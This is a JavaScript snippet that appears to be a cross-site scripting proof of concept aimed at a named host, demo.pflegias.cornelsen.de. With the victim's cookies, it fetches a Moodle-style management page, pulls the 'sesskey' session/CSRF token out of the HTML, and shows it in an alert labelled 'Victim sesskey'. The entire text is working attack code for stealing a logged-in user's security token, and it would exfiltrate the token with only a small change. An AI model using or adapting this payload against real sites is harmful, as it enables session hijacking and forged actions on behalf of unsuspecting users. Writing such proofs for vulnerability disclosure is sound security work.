(async () => {
  const url = 'https://demo.pflegias.cornelsen.de/local/learnlist/manage.php';
  try {
    const res = await fetch(url, { 
      method: 'GET',
      credentials: 'include' 
    });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const html = await res.text();

    
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    
    const scriptsText = Array.from(doc.scripts).map(s => s.textContent || '').join('\n');

  
    const m = scriptsText.match(/"sesskey"\s*:\s*"([^"]+)"/);
    let sesskey = m ? m[1] : null;

    
    if (!sesskey) {
      const m2 = html.match(/"sesskey"\s*:\s*"([^"]+)"/);
      sesskey = m2 ? m2[1] : null;
    }

    alert('document.domain: '+document.domain+'\nVictim sesskey: '+sesskey);
  } catch (err) {
    alert('Error fetching/parsing page: ' + err.message);
  }
})();
